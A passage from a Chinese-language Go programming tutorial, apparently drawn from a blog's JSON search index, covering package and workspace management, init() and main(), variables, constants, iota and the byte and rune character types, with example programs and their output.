%T\\n\u0026#34;, a) } test() } /* 运行结果： in main, a type is : uint8 in block, a type is : float64 in test, a type is : int */ 找全局变量的时候，是引用全局变量：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package main import \u0026#34;fmt\u0026#34; var a int func test() { a = 10 //引用全局变量，会修改其结果 fmt.Println(\u0026#34;a=\u0026#34;, a) } func main() { test() fmt.Println(\u0026#34;a=\u0026#34;, a) //依然是引用，test函数中已改变了其值，所以也将引用改变后的值 } /* 运行结果： a= 10 a= 10 */ 九、工程管理 9.1 Go1.11 版本之前的工作区 Go1.11 版本之前，使用 GOPATH 来管理工程。\n9.1.1 工作区介绍 Golang 代码必须放在工作区中。工作区是对应一个特定工程的目录，它应包含 3 个子目录： 1.src目录 用于以代码包的形式组织并保存 Go 源代码文件。（比如：.go .c .h .s …） src用于包含所有的源代码，是 Go1.11 版本之前，命令行工具的强制规则。 2.pkg目录 用于存放由 go install 命令构建安装后的代码包（包含 go 库源码文件）的 .a 归档文件。 3.bin目录 与 pkg 目录类似，在通过 go install 命令完成安装后，保存由 Go 命令源码文件生成的可执行文件。\n9.1.2 GOPATH设置 标准库中的包会在安装 Go 语言的位置找到。程序员自己创建的包会在 GOPATH 环境变量指定的目录中查找。 首先需要把工程目录的根路径加入到环境变量 GOPATH 中，这样才能构建这个工程。否则，即使处于同一工作目录（工作区），代码之间也无法通过绝对代码包路径完成调用。 src 这个目录是强制要求存在，而 pkg 和 bin 目录则无需手动创建，Go 命令行工具在构建过程中会自动创建这些目录。 特别注意：只有当环境变量 GOPATH 中只包含一个工作区的目录路径时，go install 命令才会把命令源码安装到当前工作区的 bin 目录下。如果环境变量 GOPATH 中包含多个工作区的路径，则必须设置环境变量 GOBIN，否则执行 go install 命令就会失效。\n9.1.3 分文件编程（同一个目录下） 1.多个源文件，必须放在 src 目录下。 2.设置 GOPATH 环境变量时，注意：别把 src 目录包含进去。 3.同一个目录，包名必须一样。 4.同一个目录，调用别的文件中的函数，无需加包名引用直接调用即可。\n9.1.4 分文件编程（不同目录下） 1.依旧必须放在 src 目录下。 2.不同目录，包名不一样。 3.调用不同包里面的函数，格式：包名.函数名()。 4.被调用的其他包里的函数名称首字母必须大写，否则对其他包不可见\n9.1.5 包 9.1.5.1 自定义包 创建的自定义包最好放在GOPATH的src目录下（或者GOPATH src的某个子目录下） 在Golang中，代码包中的源码文件名是可以任意的，但这些源码文件都必须以包声明语句作为文件中非注释语句的第一行，每个包都对应一个独立的空间 例： package calc 包中成员以名称首字母大小写决定访问权限：首字母大写可被包外访问，首字母小写仅包内成员可以访问。 注意：同一个目录（文件夹）中，每个 go 文件所声明的包名称必须一样！\n9.1.5.2 给包起个别名 语法：import 新名字 原本的包名。\n1 2 3 4 5 6 //新名字+原本的名字 import myFMT \u0026#34;fmt\u0026#34; func main() { myFMT.Println(\u0026#34;test info.\u0026#34;) } 9.1.5.3 忽略丢弃一个包 引入包的时候使用 _，主要是为了让 Golang 自动调用那个包中的 init() 函数。 例如，我有这么一个项目结构：\n1 2 3 hello hello.go main.go hello/hello.go 中的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package hello import \u0026#34;fmt\u0026#34; func init() { fmt.Println(\u0026#34;this message from hello/hello.go init() function.\u0026#34;) } func Add(a, b int) int { return a + b } func PrintHello() { fmt.Println(\u0026#34;hello message.\u0026#34;) } 我只想引入这个模块，但不想用这个模块的任何函数。那么可以在引入这个模块的时候，使用_丢弃这个包。 main.go 中的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import _ \u0026#34;gitee.com/quanquan616/hello\u0026#34; //引入的同时，丢弃这个包，我只想做初始化使用 func main() { } /* 运行结果： this message from hello/hello.go init() function. Process finished with exit code 0 */ 编译通过，没有任何问题，而且也可以看到 Golang 自动调用了 hello/hello.go 中的 init() 函数。\n9.1.5.4 下划线_丢弃包的常用场景1 1 2 import \u0026#34;database/sql\u0026#34; import _ \u0026#34;github.com/go-sql-driver/mysql\u0026#34; 第二个 import 就是不使用 mysql 包，将其丢弃，只是执行一下这个包的 init() 函数，把 mysql 的驱动注册到 sql 包里，然后程序里就可以使用 sql 包来访问 mysql 数据库了。\n9.2 Go Module 模块管理 Go1.11 开始，官方推出并建议使用 Go Module 来管理工程。 详情使用：link\n十、main()函数和init()函数 Golang 有两个保留函数：main() 和 init()。这两个函数在定义时不能有任何的参数和返回值，Go 程序会自动调用这两个函数。\n10.1 main()函数的特性 1.main() 函数是 Go 程序的唯一入口。 2.main() 函数只能应用于 main 包中，main 包中必须包含有且只有一个 main() 函数。\n10.2 init()函数的特性 1.init() 函数是用于程序执行前做包的初始化的函数，比如初始化包里的变量等。 init() 函数能够应用于所有的包中，可选的，可写可不写。init() 函数会在程序执行开始的时候被调用。所有被编译器发现的 init() 函数，都会安排在 main() 函数之前执行。init() 函数通常用在设置包、初始化变量或者其他先行引导工作。 2.不同包的 init() 函数，按照包导入的依赖关系决定该初始化函数的执行顺序。 3.init() 函数不能被其他函数调用，而是在 main() 函数执行之前，自动被调用。 4.每个包可以拥有多个 init() 函数。 不推荐这么做，强烈建议每个文件只写一个 init() 函数。\n10.3 包的其他特性 1.有时候一个包会被多个包同时导入，那么它只会被导入一次。（例如：很多包都会用到fmt包，但它只会被导入一次） 2.当一个包被导入时，如果该包还导入了其他的包，那么会先将其他包导入进来，然后再对这些包中的包级常量和变量进行初始化，紧接着执行 init() 函数（如果有）。等所有被导入的包都加载完毕了，就会对 main 包中的包级常量和变量进行初始化，然后执行 main 包中的 init() 函数（如果有），最后执行 main() 函数。\n10.4 init()函数和main()函数的异同 共同点：两个函数在定义时不能有任何的参数和返回值，且由 Go 程序自动调用。 不同电：init() 函数可以应用于任意包中，且可以重复定义多个。main() 函数只能用于 main 包中，且只能定义一个。\n","date":"2021-01-06T16:16:54Z","image":"https://w.wallhaven.cc/full/d6/wallhaven-d6o97j.png","permalink":"https://360rce.github.io/p/gryrnn22/","title":"Golang学习之函数与工程管理"},{"content":"Golang环境：https://studygolang.com/dl\nLiteIde：http://liteide.org/cn/\nGolang标准库文档：https://studygolang.com/pkgdoc\n命令行下使用基础\n1 2 3 4 go version //查看go版本 go env //查看环境信息 go build xx.go\t//编译代码，生成可执行的exe文件 go run xx.go\t//运行go文件 一、第一个 Go 程序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 1.go语言以包作为管理单位 // 2.每个go文件都必须在非注释的第一行代码中声明包名 // 3.liteide下，一个文件夹（目录）下，只能有一个main包 // 4.main包中有且只有一个main()函数 package main // main 表示包的标识 import \u0026#34;fmt\u0026#34; // 程序的入口，是从这里开始调用的 func main() { //左括号必须和函数名同行 //打印 //\u0026#34;hello go\u0026#34;打印到屏幕，Println()会自动换行 //调用函数，大部分都需要导入包 /* 这也是注释，这是块注释 */ fmt.Println(\u0026#34;hello go\u0026#34;) //go语言语句结尾是没有分号的 fmt.Println(\u0026#34;hello world\u0026#34;) } 注意：关键字 import 后面的最后一个元素是目录名，而不是包名。Golang 编译器在这个路径下寻找包。\n1.1 入口 一个 go 工程有且只有一个入口函数 main()。 注意：main() 函数不能有任何参数和返回值。\n1.2 Golang 保留的关键字 1 2 3 4 5 6 7 8 9 包管理（2个）： import\tpackage 程序实体声明与定义（8个）： chan\tconst\tfunc\tinterface\tmap\tstruct\ttype\tvar 程序流程控制（15个）： break\tcase\tcontinue\tdefault\tdefer\telse\tfallthrough\tfor\tgo\tgoto\tif\trange\treturn\tselect\tswitch 1.3 Golang预定义标识符 1 2 3 4 5 6 7 8 9 10 11 12 常量: true, false, iota, nil 类型: int, int8, int16, int32, int64, uint, uint8, uint16, uint32, uint64, uintptr, float32, float64, complex128, complex64, bool, byte, rune, string 函数: make, len, cap, new, append, copy, close, delete, complex, real, imag, panic, recover 二、数据类型 类型表示同一类的数据，计算机用来计算，计算前需要把数据存储起来，那么如何存储数据？\n2.1 数据类型的作用 告诉编译器，这个数据应该以多大的内存进行存储，方便内存分配空间。 例如：写了一个数字 10，以 byte 类型存储，在内存中就占 1 个字节的大小；以 int 类型存储，在内存中就占4个字节。\n2.2 数据类型的命名规则 1.由字母、下划线、数字构成 2.不能以数字开头 3.不能使用关键字 4.严格区分大小写\n2.3 变量 2.3.1 何为变量 程序运行期间，可以改变的量。简而言之：一开始给它一个值，之后可以改变它的值。\n2.3.2 声明变量 变量在使用前（赋值、打印等操作），必须先声明！ 语法：var 变量名 数据类型 1.声明一个变量 var a int 2.同时声明多个变量 var b, c int\n2.3.3 变量的声明及赋值 例1：\n1 2 var a int a = 10 2.3.4 变量的初始化 所谓变量的初始化就是：声明变量的时候同时赋值。 例1：\n1 2 var b int = 10 // 声明变量时，同时赋值（一步到位） // int是可以省略不写的 例2：\n1 2 3 4 5 var b int b = 20 // 此例中分了两步走： // 1.先声明 // 2.后赋值 2.3.5 自动推导类型 注意：自动推导类型必须给初始化值，它是通过这个值来确定具体的数据类型！ 例1：\n1 2 3 4 5 6 7 8 9 10 11 package main import \u0026#34;fmt\u0026#34; func main() { c := 30 // 编译器会根据 30 这个值来推导对应的数据类型 // %T 打印变量所属的类型 fmt.Printf(\u0026#34;c type is : %T\\n\u0026#34;, c) // 运行结果： // c type is : int } 自动推导类型的大致流程：先声明 c 的类型，再给 c 赋值为整数值 30。 注意：海象运算符 := 前面，必须要有新的变量，不然就会报错。因为海象运算符的流程是先声明变量的类型，再给变量赋值（几乎同时发生），如果没有新的变量，那么就会变成重复声明了。\n2.3.6 多重赋值 2.3.6.1 var() 包裹起来的多重声明 1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; func main() { var ( a int b float64 ) // 关键字var+()，把多个变量包裹起来 a = 10 b = 3.14 fmt.Println(a, b) // 10 3.14 } 2.3.6.2 自动推导类型（官方推荐写法） 使用海象运算符 :=：\n1 2 3 4 func main() { a, b := 10, 3.14 fmt.Println(a, b) // 10 3.14 } 2.3.7 匿名变量 使用单个下划线 _ 表示匿名变量，丢弃数据且不处理，也不会占用内存空间。\n1 2 3 4 5 6 7 8 9 package main import \u0026#34;fmt\u0026#34; func main() { i, j := 10, 20 tmp, _ := i, j // 这里，j就被丢弃掉了，不会处理j这个变量了 fmt.Println(tmp, j) // 打印j的值依然是用之前的20 } 2.3.8 变量的输入 使用内建 fmt 包下的 Scan() 函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func main() { var a int fmt.Printf(\u0026#34;输入变量a的值：\u0026#34;) fmt.Scanf(\u0026#34;%d\u0026#34;, \u0026amp;a) // 取a的地址，此处会阻塞等待用户的输入 // 或者下面更加简便的等价的写法： // fmt.Scan(\u0026amp;a) // 别忘了取地址 fmt.Printf(\u0026#34;刚才输入的值，a=%d\\n\u0026#34;, a) } /* 运行结果： 输入变量a的值：11 刚才输入的值，a=11 */ 2.3.9 变量使用注意事项 1.函数外的每个语句都必须以关键字开始。（var、const、func 等） 2.海象运算符 := 不能在函数外使用。 3.下划线 _ 多用于占位，不会占用内存空间，表示丢弃该值。\n2.4 常量 2.4.1 何为常量 程序运行期间，不能改变的量。一开始给了值，就不允许再改变了！\n2.4.2 初始化常量 常量必须给值，所以就是直接初始化常量了，声明和赋值一步完成。\n2.4.2.1 语法 const 常量名 [数据类型] = 值\n2.4.2.2 例1，单个初始化 1 2 3 4 5 6 7 8 9 10 package main import \u0026#34;fmt\u0026#34; const a = 10 const b = 10 func main() { fmt.Println(a, b) } 2.4.2.3 例2，包裹起来一起初始化 把例1的常量声明，用括号括起来，写在一起：\n1 2 3 4 const ( a = 10 b = 10 ) 2.4.2.4 例3，多重初始化 1 2 3 4 5 const a, b = 10, 3.14 func main() { fmt.Println(a, b) //10 3.14 } 2.4.3 iota枚举 2.4.3.1 iota的特性1 iota 是常量自动生成器，每一行，自动累加1。\n2.4.3.2 iota的特性2 iota 只能在常量表达式中使用（只能在 const 中使用）。 特性1 + 特性2的示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import \u0026#34;fmt\u0026#34; const ( a = iota b = iota c = iota ) func main() { fmt.Printf(\u0026#34;a = %d, b = %d, c = %d\\n\u0026#34;, a, b, c) //a = 0, b = 1, c = 2 } 2.4.3.3 iota的特性3 遇到另一个 const，iota 的值重新从 0 开始计算。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package main import \u0026#34;fmt\u0026#34; const ( a = iota b c ) const ( d = iota e ) func main() { const ( f = iota g h ) fmt.Println(\u0026#34;a=\u0026#34;, a) fmt.Println(\u0026#34;b=\u0026#34;, b) fmt.Println(\u0026#34;c=\u0026#34;, c) fmt.Println(\u0026#34;d=\u0026#34;, d) fmt.Println(\u0026#34;e=\u0026#34;, e) fmt.Println(\u0026#34;f=\u0026#34;, f) fmt.Println(\u0026#34;g=\u0026#34;, g) fmt.Println(\u0026#34;h=\u0026#34;, h) } /* 运行结果： a= 0 b= 1 c= 2 d= 0 e= 1 f= 0 g= 1 h= 2 */ 2.4.3.4 iota的特性4 同一块 const 内，可以只写一个 iota 预定义标识符。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; func main() { const ( a1 = iota b1 c1 d1 ) fmt.Printf(\u0026#34;a1 = %d, b1 = %d, c1 = %d, d1 = %d\\n\u0026#34;, a1, b1, c1, d1) //a1 = 0, b1 = 1, c1 = 2, d1 = 3 } 2.4.3.5 iota的特性5 如果是同一行，iota 值都一样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import \u0026#34;fmt\u0026#34; func main() { const ( i = iota j1, j2, j3 = iota, iota, iota k = iota ) fmt.Printf(\u0026#34;i=%d, j1=%d, j2=%d, j3=%d, k=%d\\n\u0026#34;, i, j1, j2, j3, k) //i=0, j1=1, j2=1, j3=1, k=2 } 原因：iota 是每一行自动累加 1，在同一行内的 iota 值都是相同的。\n2.4.3.6 iota的特性6 iota 的值，只取决于它所在第几行（下标从 0 开始），可以理解成为：行索引。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package main import \u0026#34;fmt\u0026#34; func main() { const ( i = 10 j1, j2, j3 = iota, iota, iota k = 20 l, m = iota, iota n = \u0026#34;abc\u0026#34; o = iota ) fmt.Printf(\u0026#34;i=%d, j1=%d, j2=%d, j3=%d, k=%d, l=%d, m=%d, n=%s, o=%d\\n\u0026#34;, i, j1, j2, j3, k, l, m, n, o) } /* 运行结果： i=10, j1=1, j2=1, j3=1, k=20, l=3, m=3, n=abc, o=5 */ 2.4.4 常量使用的注意事项 2.4.4.1 初始化常量不允许使用海象运算符:= 1 const :b = 10 2.4.4.2 常量不允许被修改 下例中，对常量重新赋值就会报错：\n1 2 const a = 10 a = 20 2.4.4.3 常量必须给值 常量表示不可变的值，不给初始值，怎么让编译器去常量化呢？\n1 2 3 4 const( a int b ) 三、基础数据类型 指定数据类型是告诉编译器，这个值需要分配多大的内存空间。\n3.1 总述 3.1.1 Go 语言中的数据类型 以下是 Go 语言中的数据类型：\n类型 名称 长度 零值 说明 bool 布尔类型 1 false 其值不为真即为假，不可以用数字代表true或false byte 字节型 1 0 uint8别名 rune 字符类型 4 0 专用于存储unicode编码，等价于uint32 int, uint 整型 4或8 0 32位或64位 int8, uint8 整型 1 0 -128 ~ 127, 0 ~ 255 int16, uint16 整型 2 0 -32768 ~ 32767, 0 ~ 65535 int32, uint32 整型 4 0 -21亿 ~ 21 亿, 0 ~ 42 亿 int64, uint64 整型 8 0 float32 浮点型 4 0.0 小数位精确到7位 float64 浮点型 8 0.0 小数位精确到15位 complex64 复数类型 8 complex128 复数类型 16 uintptr 整型 4或8 以存储指针的uint32或uint64整数 string 字符串 “” utf-8字符串 3.1.2 Go 语言的数据类型分类 1.基础类型（Basic Types）。包括了：数值类型（支持整型、浮点型、复数）、字符串类型、布尔类型。 2.符合类型（Aggregate Types）。包括了：数组、结构体。 3.引用类型（Reference Types）。包括了：指针、切片、map、channel、接口、函数。\n3.1.3 注意数据类型的溢出 每个数据类型都有一个固定的取值范围，数据类型的值，不能超过这个范围。 数据类型的溢出有 2 种：编译时、运行时。\n3.1.3.1 数据类型编译时的溢出 以下示例会导致编译时就报错：\n1 2 3 4 5 6 7 8 9 10 11 12 13 func main() { var i uint8 for i = 0; i \u0026lt; 270; i++ { } } /* 运行结果： # command-line-arguments .\\main.go:5:15: constant 270 overflows uint8 Compilation finished with exit code 2 */ 这个示例就相当于语法错误了，数值已经溢出了该数据类型，编译都编不过。 使用 IDE，就会提示错误：\n3.1.3.2 数据类型运行时的溢出 以下示例会导致运行时的溢出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func main() { var myint uint8 myint = 250 for i := 0; i \u0026lt; 15; i++ { fmt.Println(myint) myint++ } } /* 运行结果： 250 251 252 253 254 255 0 1 2 3 4 5 6 7 8 Process finished with exit code 0 */ 这个示例属于逻辑错误，不会报错，但是会影响到最终的结果。\n3.2 浮点型 下例中，f2 会被自动推导成为 float64 类型：\n1 2 3 4 func main() { f2 := 3.14 fmt.Printf(\u0026#34;f2 type is : %T\\n\u0026#34;, f2) //f2 type is : float64 } float64 比 float32 更加准确。使用自动推导类型的时候，浮点数会被推导成为 float64 类型。\n3.3 字符类型 字符只是数值的特殊用例，Golang 使用数值来表示一个字符。 Golang 中，使用 byte、int32、rune 类型，来代表一个字符，一个字符由一对单引号 '' 包裹起来。 byte 类型（字节类型），它的本质是 uint8 类型，存储的时候会以一个 uint8 数值进行存储。 int32 类型，代表一个 UTF-8 字符。它还有另外一个书写方式：rune，两者是完全等价的，只是书写方式的不同而已（就像本名和小名，int32 是本名，rune 是小名）。\n3.3.1 用byte表示一个单字符 byte 类型的本质是用 uint8 类型进行存储，uint8 的范围是 [0~255]。使用 byte 类型存储一个字符的时候，注意不要超出 uint8 的范围。\n3.3.1.1 byte类型的基本使用 可以把 [0~255] 范围内的任意整数赋值给一个 byte 类型。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func main() { var ch byte //声明字符类型 ch = 97 fmt.Println(\u0026#34;ch =\u0026#34;, ch) //打印出数字97，因为Golang是使用一个整型数值来表示一个字符 fmt.Printf(\u0026#34;%c, %d\\n\u0026#34;, ch, ch) //%c，指定以字符方式打印 fmt.Println(\u0026#34;--------------------------\u0026#34;) ch = \u0026#39;A\u0026#39; fmt.Println(\u0026#34;ch =\u0026#34;, ch) //%v是万能匹配格式符，表示该变量本身的值 //因为Golang是使用一个整型数值来表示一个字符，因此ch本身的值就是一个整型数值 fmt.Printf(\u0026#34;%%v=%v, %%c=%c\\n\u0026#34;, ch, ch) } /* 运行结果： ch = 97 a, 97 -------------------------- ch = 65 %v=65, %c=A */ 输出时，如果想要看到一个完整的字符，需要指定以字符 %c 格式显示，否则字符类型是以它本质的 uint8 数值来显示的。\n3.3.1.2 使用自动推导时，一个字符会被推导成 int32 类型 使用自动推导类型的时候，一个字符会被推导成 int32 类型。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 func main() { ch := \u0026#39;a\u0026#39; //\u0026#39;a\u0026#39;是一个字符 fmt.Println(\u0026#34;ch = \u0026#34;, ch) fmt.Printf(\u0026#34;ch type is : %T\\n\u0026#34;, ch) //自动推导成int32类型 fmt.Printf(\u0026#34;%%v = %v\\n\u0026#34;, ch) //%v万能匹配格式符，表示该变量本身的值 fmt.Printf(\u0026#34;%%c = %c\\n\u0026#34;, ch) //%c指定以字符输出 fmt.Println(\u0026#34;----------------------\u0026#34;) ch = \u0026#39;中\u0026#39; fmt.Println(\u0026#34;ch = \u0026#34;, ch) fmt.Printf(\u0026#34;ch type is : %T\\n\u0026#34;, ch) fmt.Printf(\u0026#34;%%v = %v\\n\u0026#34;, ch) fmt.Printf(\u0026#34;%%c = %c\\n\u0026#34;, ch) fmt.Println(\u0026#34;----------------------\u0026#34;) ch = \u0026#39;,\u0026#39; //英文状态下的逗号 fmt.Println(\u0026#34;ch = \u0026#34;, ch) fmt.Printf(\u0026#34;ch type is : %T\\n\u0026#34;, ch) fmt.Printf(\u0026#34;%%v = %v\\n\u0026#34;, ch) fmt.Printf(\u0026#34;%%c = %c\\n\u0026#34;, ch) ch = \u0026#39;，\u0026#39; //中文状态下的逗号 fmt.Println(\u0026#34;ch = \u0026#34;, ch) fmt.Printf(\u0026#34;ch type is : %T\\n\u0026#34;, ch) fmt.Printf(\u0026#34;%%v = %v\\n\u0026#34;, ch) fmt.Printf(\u0026#34;%%c = %c\\n\u0026#34;, ch) fmt.Println(\u0026#34;----------------------\u0026#34;) ch = \u0026#39;\\n\u0026#39; //换行符 fmt.Println(\u0026#34;ch = \u0026#34;, ch) fmt.Printf(\u0026#34;ch type is : %T\\n\u0026#34;, ch) fmt.Printf(\u0026#34;%%v = %v\\n\u0026#34;, ch) fmt.Printf(\u0026#34;%%c = %c\u0026#34;, ch) //换行符是控制字符，不会直接显示，但会产生换行效果 } /* 运行结果： ch = 97 ch type is : int32 %v = 97 %c = a ---------------------- ch = 20013 ch type is : int32 %v = 20013 %c = 中 ---------------------- ch = 44 ch type is : int32 %v = 44 %c = , ch = 65292 ch type is : int32 %v = 65292 %c = ， ---------------------- ch = 10 ch type is : int32 %v = 10 %c = //\u0026#39;\\n\u0026#39;会产生换行效果，即使fmt.Printf()格式化字符串中不在末尾写\u0026#39;\\n\u0026#39;，也会发生换行 */ 可以看到，无论是单字符还是复合字符，就算本身是个 ASCII 码字符。只要用了自动推导类型，那么这个字符就会被推导成 int32 类型。 我个人猜想，Golang 并不能很明确地确定（或者判定时会影响一点性能）这个字符到底是单字符还是复合字符。所以就用了 int32 类型来保证能够存储任何类型字符，int32 类型也可以书写成 rune 类型，rune 类型的本质是 int32 类型。\n3.3.2 案例 3.3.2.1 案例1：英文字母大小写转换 byte 本质上是 uint8 类型，所以两者可以直接相互转换、运算。格式化时，用 %c 来表示一个字符，用 %d 来表示整型数值。 英文字母大小写转换时，使用字符类型进行操作会非常好用。大小写之间的规律：大小写相差 32，小写的数值大。（大写 A 是 65，小写 a 是 97） 例：\n1 2 3 4 5 6 7 8 9 10 11 12 func main() { fmt.Printf(\u0026#34;大写A:%d，小写a: %d\\n\u0026#34;, \u0026#39;A\u0026#39;, \u0026#39;a\u0026#39;) //大写A:65，小写a:97 fmt.Printf(\u0026#34;大写A转小写a: %c\\n\u0026#34;, \u0026#39;A\u0026#39;+32) //大写A转小写a: a fmt.Printf(\u0026#34;小写a转大写A：%c\\n\u0026#34;, \u0026#39;a\u0026#39;-32) //小写a转大写A：A } /* 运行结果： 大写A:65，小写a: 97 大写A转小写a: a 小写a转大写A：A */ 3.3.2.2 案例2：计算英文单词每个字母加起来的值 3.3.2.2.1 题目描述 英语 26 个字母分别代表 1 到 26 的数字，编写一段代码，计算出单词的每个字母加起来等于多少。 例如： hardwork（勤奋）8+1+18+4+23+15+18+11=98 knowledge（知识）11+14+15+23+12+5+4+7+5=96 love（爱）12+15+22+5=54 luck（运气）12+21+3+11=47 attitude（态度）1+20+20+9+20+21+4+5=100\n3.3.2.2.2 实现方式 实现方式有很多，这里采用：对字符本身的 Unicode 码值的运算来实现。 实现思路： Golang 中，字符串的存储方式是：采用 UTF-8 编码格式下的 Unicode 码值，进行存储。遍历字符串中的每个字符，都将得到这个字符的 Unicode 码值。 假设，输入的都是正确的英文单词。那么单词中的每个字母，它就是一个字符，可以得到它本身的 Unicode 码值。 通过减值的方式来确定字母的大小写。大写字母的范围是 [65 ~ 90]， 小写字母的范围是 [97 ~ 122]，任何一个大写字母减去 96，都会小于 1，因此遇到大写字母，需要减去 64，刚好能够对应上 26 个字母，由 1 到 26 的数值排列。小写字母直接减去 96，就能对应上了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package main import \u0026#34;fmt\u0026#34; // 计算一个英文单词中的每个字母之和 func computeletters(s string) (sum int64) { for i, char := range s { // 非英文字母的情况 // 空格的 ASCII 码值为 32，需要把空格的情况添加进去 if char != 32 \u0026amp;\u0026amp; !(char \u0026gt;= 65 \u0026amp;\u0026amp; char \u0026lt;= 90) \u0026amp;\u0026amp; !(char \u0026gt;= 97 \u0026amp;\u0026amp; char \u0026lt;= 122) { fmt.Printf(\u0026#34;char:%c, index:%d. does not an english letter.\\n\u0026#34;, char, i) return -1 } if char == 32 { // 遇到空格，什么都不做 } else if char-96 \u0026lt; 1 { // Unicode 值减去 96，小于了 1，说明这个英文字母是大写的，大写应该减 64 sum += int64(char - 64) } else { sum += int64(char - 96) } } return } func main() { arr := []string{\u0026#34;hardwork\u0026#34;, \u0026#34;knowledge\u0026#34;, \u0026#34;love\u0026#34;, \u0026#34;luck\u0026#34;, \u0026#34;attitude\u0026#34;} for i := range arr { v := computeletters(arr[i]) fmt.Printf(\u0026#34;word: %s, total value is:%d\\n\u0026#34;, arr[i], v) } } /* 运行结果： word: hardwork, total value is:98 word: knowledge, total value is:96 word: love, total value is:54 word: luck, total value is:47 word: attitude, total value is:100 */ byte 类型的本质是 uint8 类型，uint8 类型是一个整型数值，范围 [0~255] 的整数，所以它能与另一个整型数值进行运算。\n3.3.2 用int32类型存储一个复合字符 当处理中文、日文或者其他复合字符时，则需要用 int32 类型来处理 Unicode 文本。 int32 类型也可以书写成 rune，rune 类型本质就是 int32 类型。\n3.3.2.1 存储一个中文字符的方式 先看一个错误的示例：\n1 2 3 4 5 func main() { var ch byte ch = \u0026#39;中\u0026#39; //这行会报错：constant 20013 overflows byte，超出了ASCII码的范围 fmt.Printf(\u0026#34;ch type is : %T\\n\u0026#34;, ch) } 注意：byte 的范围是 [0~255]，20013 明显超出了范围！ 接下来，使用自动推导的技巧来实现存储一个中文字符：\n1 2 3 4 5 6 7 8 9 10 11 12 13 func main() { ch := \u0026#39;中\u0026#39; fmt.Printf(\u0026#34;ch type is : %T\\n\u0026#34;, ch) //int32 fmt.Printf(\u0026#34;using %%v, ch = %v\\n\u0026#34;, ch) fmt.Printf(\u0026#34;using %%c, ch = %c\\n\u0026#34;, ch) } /* 运行结果： ch type is : int32 using %v, ch = 20013 using %c, ch = 中 */ 与 3.3.1.2 中的示例演示一样：使用自动推导的时候，一个中文字符会被推导成为 int32 类型。\n3.3.4 int32和rune的关系以及区别 3.3.4.1 int32和rune之间的关系 等价的关系。rune 只是 int32 的一个别名，在功能上完全等价。\n3.3.4.2 见名知意的区别 用于更好地让程序猿区分，这个变量是字节值还是无符号整数值。用 rune 来表示一个字符值，用 int32 来表示一个整数值。 让人一看这个数据类型就能知道，这个变量的最终用途是什么。 例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 func main() { chars := []rune{443, 27017, 6379, 3306} fmt.Println(string(chars)) //最终作为字符来呈现 commonPorts := []int32{443, 27017, 6379, 3306} fmt.Println(\u0026#34;there are some common ports: \u0026#34;, commonPorts) //最终作为数值来呈现 } /* 运行结果： ƻ榉ᣫ೪ there are some common ports: [443 27017 6379 3306] */ 看到 rune 就知道，最终呈现的是字符；看到 int32 就知道，最终显示数值。个人认为，int32 和 rune 的区别就是见名知意的作用：看它们的数据类型就知道了该数据的最终意图和呈现方式。\n3.3.5 转义字符 有两种字符：一种是控制字符，另一种是可显示字符。 可显示字符就是可以输出，能看得到内容的字符。 控制字符就是转义字符，有特殊的含义，是不可见的。以反斜杠 \\ 开头的是转义字符。 例1：先看这个例子：\n1 2 3 4 5 6 7 8 9 10 func main() { fmt.Printf(\u0026#34;hello go\u0026#34;) fmt.Printf(\u0026#34;abcdefg\u0026#34;) } /* 运行结果： hello goabcdefg //没有换行符，内容会紧跟在上一行的内容后面 /* 例2： \\n 不会输出到屏幕上，是看不见的。但它会进行换行操作，属于功能性的字符：\n1 2 3 4 5 6 7 8 9 10 func main() { fmt.Printf(\u0026#34;hello go%c\u0026#34;, \u0026#39;\\n\u0026#39;) fmt.Printf(\u0026#34;abcdefg\u0026#34;) } /* 运行结果： hello go abcdefg */ 3.3.6 注意事项 3.3.6.1 字符只能使用一对单引号包裹起来 一个字符只能使用一对单引号''包裹起来！ 下例中，ch = “a” 这行代码会报错：\n1 2 3 4 5 func main() { var ch byte //声明字符类型 ch = \u0026#34;a\u0026#34; //报错：cannot use \u0026#34;a\u0026#34; (type string) as type byte in assignment（不能使用字符串作为byte字符的值） fmt.Printf(\u0026#34;%c, %d\\n\u0026#34;, ch, ch) } 下例是能够正确运行的：\n1 2 3 4 5 func main() { var ch byte //声明字符类型 ch = \u0026#39;a\u0026#39; fmt.Printf(\u0026#34;%c, %d\\n\u0026#34;, ch, ch) //a, 97 } 3.3.6.2 一对单引号 '' 中，只能放一个字符 a := 'abc'会报错\n3.3.6.3 byte类型的范围 byte 类型实质上是一个 uint8 类型，uint8 的范围是 [0 ~ 255]（0 和 255 都能被取到），不在这个范围就是值溢出，会报错！ 数值不在 uint8 范围内的错误示例：\n1 2 3 4 5 6 7 8 9 func main() { var ch byte //声明字符类型 ch = 256 fmt.Printf(\u0026#34;%c, %d\\n\u0026#34;, ch, ch) /* 报错内容如下： # command-line-arguments .\\main.go:7:7: constant 256 overflows byte */ } 3.3.7 ASCII码参考表 ASCII值 控制字符 ASCII值 控制字符 ASCII值 控制字符 ASCII值 控制字符 0 NUT 32 (space) 64 @ 96 、 1 SOH 33 